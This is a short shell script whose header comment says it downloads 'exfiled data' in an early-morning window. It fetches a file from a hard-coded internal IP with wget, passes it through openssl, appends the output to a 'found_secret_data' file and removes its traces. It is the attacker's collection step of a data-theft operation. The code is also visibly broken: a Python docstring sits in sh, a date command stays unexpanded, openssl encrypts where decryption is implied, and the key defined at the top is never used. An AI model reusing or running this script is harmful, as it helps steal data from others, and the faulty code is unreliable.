#!/bin/sh
"""
Use this to download the exfiled data
Download between 1:30 and 2:30 am
"""
pswd=0xC639A572E14D5075C526FDDD43E4ECF6B095EA17783D32EF3D2710AF9F359DD4
iv=D09A4D2C5DC39843FE075313A7EF2F4C
ip=172.25.0.3
data="found_secret_data.txt"
echo '$(date)' >> $data
wget -O new.txt http://$ip:8080/secretData.html 
touch new_dec.txt
touch new.txt
openssl enc -aes-256-cbc -salt -in new.txt -out new_dec.txt -k password
cat "new_dec.txt" >> $data
rm -f new.txt
rm -f new_dec.txt